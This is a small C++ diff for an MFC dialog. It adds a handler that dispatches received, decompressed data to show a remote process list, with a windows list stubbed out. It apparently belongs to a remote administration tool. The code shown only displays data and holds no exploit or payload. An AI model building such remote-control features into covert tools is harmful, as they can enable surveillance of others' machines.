@@ -20,7 +20,9 @@ void CSystemDlg::GetProcessList()
 
 void CSystemDlg::ReSize()
 {
-	if (m_ListProcess.m_hWnd == NULL) {
+	if (m_ListProcess.m_hWnd == NULL &&
+		m_ListWindows.m_hWnd == NULL)
+	{
 		return;
 	}
 
@@ -259,4 +261,22 @@ void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
 	pSub->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
 
 	*pResult = 0;
+}
+
+void CSystemDlg::OnReceiveComplete()
+{
+	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
+	case TOKEN_PSLIST:
+		ShowProcessList();
+		break;
+
+	case TOKEN_WSLIST:
+		//ShowWindowsList();
+		break;
+
+	default:
+		// 传输发生异常数据
+		break;
+	}
+
 }
